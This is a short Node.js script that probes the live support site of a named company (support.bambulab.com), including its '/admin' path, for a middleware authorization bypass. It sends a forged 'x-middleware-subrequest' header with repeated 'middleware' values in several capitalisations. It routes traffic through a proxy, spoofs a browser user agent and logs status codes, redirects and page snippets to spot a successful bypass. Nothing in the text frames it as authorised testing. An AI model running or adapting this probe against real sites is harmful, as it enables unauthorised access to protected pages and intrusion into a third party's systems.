const {ProxyAgent, fetch}=require('undici');
const d=new ProxyAgent(process.env.HTTPS_PROXY||'http://127.0.0.1:7890');
const UA='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36';
const B='https://support.bambulab.com';
const vals=['middleware','middleware:middleware','middleware:middleware:middleware','middleware:middleware:middleware:middleware','middleware:middleware:middleware:middleware:middleware','src/middleware:src/middleware:src/middleware:src/middleware:src/middleware','pages/_middleware','foo',''];
(async()=>{
 for(const p of ['/','/cn/liveChat','/admin']){
  console.log('###',p);
  for(const v of vals){
   for(const name of ['x-middleware-subrequest','X-Middleware-Subrequest','x-middleware-subRequest']){
    try{const r=await fetch(B+p,{headers:{'user-agent':UA,accept:'text/html',[name]:v},redirect:'manual',dispatcher:d,signal:AbortSignal.timeout(15000)});console.log(r.status,JSON.stringify(name),JSON.stringify(v),'loc=',r.headers.get('location'),'|',(await r.text()).slice(0,60).replace(/\s+/g,' '));}catch(e){console.log('ERR',name,v,e.message)}
   }
  }
 }
})();
